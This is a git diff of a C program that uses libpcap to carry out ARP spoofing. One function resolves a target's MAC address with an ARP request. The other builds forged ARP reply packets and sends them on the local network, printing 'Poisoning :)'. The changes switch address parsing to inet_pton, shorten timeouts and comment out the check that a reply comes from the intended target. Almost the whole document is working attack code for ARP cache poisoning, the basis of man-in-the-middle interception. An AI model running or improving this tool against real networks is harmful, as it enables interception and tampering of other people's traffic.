@@ -106,9 +106,10 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
   struct pcap_pkthdr* header_ptr;
   const u_char *pkt_data;
 
-  char mac[MAC_ADDR_SIZE]={0,};
+  u_char mac[MAC_ADDR_SIZE]={0,};
+  u_char targetIP_hex[4];
 
-  handle = pcap_open_live(ifname, 65536, 0, 1000, errbuf);
+  handle = pcap_open_live(ifname, 65536, 0, 1, errbuf);
 
   if (handle == NULL) 
   {
@@ -117,27 +118,39 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
   }
 
   //Target IP : Destination IP Address : ARP Packet
-  sscanf(targetIP, "%3d.%3d.%3d.%3d", 
+/*  memcpy(targetIP,arp->arp_tpa,sizeof(targetIP));
+  memcpy(localMAC,arp->arp_tpa,sizeof(localMAC));
+  memcpy(localIP,arp->arp_tpa,sizeof(localIP));*/
+
+  inet_pton(AF_INET, targetIP  , targetIP_hex);  
+  inet_pton(AF_INET, targetIP  , arp->arp_tpa); 
+ 
+
+/*  sscanf(targetIP, "%d.%d.%d.%d", 
     (u_char *) &arp->arp_tpa[0],
     (u_char *) &arp->arp_tpa[1],
     (u_char *) &arp->arp_tpa[2],
-    (u_char *) &arp->arp_tpa[3]);
+    (u_char *) &arp->arp_tpa[3]);*/
 
   //Source MAC Address : ARP Packet : 
-  sscanf(localMAC, "%2x:%2x:%2x:%2x:%2x:%2x",  
+  sscanf(localMAC, "%x:%x:%x:%x:%x:%x",  
     (u_char *) &arp->arp_sha[0],
     (u_char *) &arp->arp_sha[1],
     (u_char *) &arp->arp_sha[2],
     (u_char *) &arp->arp_sha[3],
-    (u_char *) &arp->arp_sha[4],
+    (u_char *) &arp->arp_sha[4],    
     (u_char *) &arp->arp_sha[5]);
 
+
   //Source IP Address : ARP Packet
-  sscanf(localIP, "%3d.%3d.%3d.%3d", 
+  inet_pton(AF_INET, localIP   , arp->arp_spa); 
+
+
+/*  sscanf(localIP, "%d.%d.%d.%d", 
    (u_char *) &arp->arp_spa[0],
    (u_char *) &arp->arp_spa[1],
    (u_char *) &arp->arp_spa[2],
-   (u_char *) &arp->arp_spa[3]);
+   (u_char *) &arp->arp_spa[3]);*/
 
   //Target Mac : Destination Mac Address : ARP Packet   
   memset(arp->arp_tha, 0x00, 6);      
@@ -166,15 +179,16 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
   } 
 
 
-  while(1) {
-
+  while(1)
+  {   
     if(pcap_next_ex(handle, &header_ptr, &pkt_data)!=1)
     {
-      printf("pcap_sendpacket err %s\n", pcap_geterr(handle));      
+      printf("pcap_sendpacket err %s\n", pcap_geterr(handle));
+      continue;     
     }
     else
     {
-      printf("Recv arp REPLY : ");
+      printf("Recv Packet : ");
     }
 
     eth = (struct ether_header*)pkt_data;
@@ -191,20 +205,33 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
       //not IPv4 ARP
       continue;
     }
-    if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REPLY) {
-      //not ARP reply
-      continue;
-    }
+    if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY)
+    {
+      printf("ARP REPLY : ");
 
-    sprintf(targetMAC, "%02X:%02X:%02X:%02X:%02X:%02X", 
-      (u_char)arp->arp_sha[0],
-      (u_char)arp->arp_sha[1],
-      (u_char)arp->arp_sha[2],
-      (u_char)arp->arp_sha[3],
-      (u_char)arp->arp_sha[4],
-      (u_char)arp->arp_sha[5]);
-    break;
+ /*     printf("\napr->arp_spa: %x, targetIP : %x \n",arp->arp_spa,targetIP_hex);
+      printf("\napr->arp_spa: %d.%d.%d.%d \n ",arp->arp_spa[0], arp->arp_spa[1], arp->arp_spa[2], arp->arp_spa[3]);
+      printf("\ntargetIP_hex: %d.%d.%d.%d \n ",targetIP_hex[0], targetIP_hex[1], targetIP_hex[2], targetIP_hex[3]);
+ */   
+      //if(memcmp(arp->arp_spa,targetIP_hex,sizeof(targetIP))==0)
+      //{
+   
+        sprintf(targetMAC, "%02X:%02X:%02X:%02X:%02X:%02X", 
+          (u_char)arp->arp_sha[0],
+          (u_char)arp->arp_sha[1],
+          (u_char)arp->arp_sha[2],
+          (u_char)arp->arp_sha[3],
+          (u_char)arp->arp_sha[4],
+          (u_char)arp->arp_sha[5]);
+        break;
+      /*}
+      else
+          continue;  
+      }*/
+    }else
+      continue;      
   }
+
   printf(" target Mac ADDR : %s\n",targetMAC);
   pcap_close(handle);
 }
@@ -219,12 +246,14 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
   struct ether_header * eth = (struct ether_header *) packet;
   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
 
-  handle = pcap_open_live(ifname, 65536, 0, 1000, errbuf);
+  handle = pcap_open_live(ifname, 65536, 0, 1, errbuf);
 
   if (handle == NULL) {
     fprintf(stderr, "Cannot open device %s: %s\n", ifname, errbuf);
     exit(EXIT_FAILURE);
-  }
+  }  
+
+
    //Source MAC Address : ARP Packet : 
   sscanf(localMAC, "%x:%x:%x:%x:%x:%x",  
     (u_char *) &arp->arp_sha[0],
@@ -272,7 +301,7 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
   arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY
 
-  printf("\nARP SPOOFING :) : %s \n", targetIP);
+  printf(" [*] ARP %s ", targetIP);
 
   
   if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
@@ -281,7 +310,7 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
   } 
   else 
   {
-    printf("Attack arp %s: %s is at %s\n", ifname, targetIP, targetMAC );
+    printf(" Poisoning :) \n" );
   }  
 
   pcap_close(handle);
